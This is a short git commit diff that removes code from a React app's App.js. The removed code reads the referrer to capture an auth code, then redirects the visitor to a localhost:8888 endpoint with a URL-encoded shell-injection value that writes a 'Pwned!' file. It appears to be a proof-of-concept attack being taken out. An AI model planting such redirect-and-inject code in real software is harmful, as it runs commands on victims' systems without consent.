56319cad312ad9242cd4c7779c644c40d384c91b
Samuel Thorson <sthor726@gmail.com>
2025-03-16 17:40:39 -0500

    returned to normal

--- react-app/src/App.js
+++ react-app/src/App.js
@@ -14,20 +14,6 @@ import ScrollToTop from "./ScrollToTop.js";
 
 function App() {
 
-  useEffect(() => {
-    const referrer = document.referrer;
-    if (referrer) {
-      if (!referrer.includes("localhost")) {
-        return;
-      }
-      //console.log("Referrer URL:", referrer);
-      const authCode = referrer.split('/').filter(Boolean).pop();
-      //console.log("Auth Code:", authCode);
-      const attack = `http://localhost:8888/${authCode}/add/url/https%3A%2F%2Fwww.google.com%2F%27%3Becho%20%22Pwned%21%22%20%3E%20pwned.txt%3B%27/`
-      //console.log("Attack URL:", attack);
-      window.location.href = attack; // Redirect the user to the attack URL
-    }
-  }, []);
 
   return (
     <div className="App">
